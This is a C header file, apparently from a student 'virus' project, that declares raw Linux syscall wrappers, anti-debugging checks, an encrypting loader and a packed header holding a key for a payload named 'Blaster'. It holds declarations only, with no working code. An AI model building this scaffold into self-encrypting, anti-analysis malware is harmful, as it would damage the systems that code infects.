#ifndef FT_VIRUS_H
# define FT_VIRUS_H

# define USER_MEMORY_SIZE	(0X1000*12)

#include <stdint.h>
#include <stdio.h>
#include <sys/time.h>
#include <sys/mman.h>
#include <errno.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <stdlib.h>

/* -- Syscall -- */
#define __NR_gettimeofday	0x4E
#define __NR_mmap2		192
#define __NR_mprotect		0X7D
#define __NR_exit		0X1
#define __NR_getpid		0X14
#define __NR_getppid		0X40
#define __NR_alarm		0X1B
#define __NR_signal		0X30
#define __NR_kill		0X25
#define __NR_timer_create	0X103
#define __NR_timer_settime	0X104


#define	RET			0XC3


typedef struct	s_header
{
		unsigned char	key[16];
		char		*address;
		uint32_t	size;
		uint8_t		pos,mod;
}		__attribute__((packed))t_header;


typedef struct	s_header_debugging1
{
		uint8_t		key;
		uint8_t		err;
}		__attribute__((packed))t_header_debugging1;

void	Main_Blaster( void );
void 	security_viruse ( int );

/* -- Wrapper for kernel syscall -- */
long 	Syscall0( int num_syscall );
long 	Syscall1( int num_syscall, long );
long 	Syscall2( int num_syscall, long, long );
long	Syscall3( int num_syscall, long, long, long );
long	Syscall4( int num_syscall, long, long, long, long );
long	Syscall5( int num_syscall, long, long, long, long, long );
long	Syscall6( int num_syscall, long, long, long, long, long, long);


long	DEBUGGING0( void );
long	DEBUGGING1( void );

/* -- Loader -- */
/* -- For Encrypt -- */
void 	loader( void );
void	VIRUSE_HEADER( void );

void	Blaster_end( void );
#endif
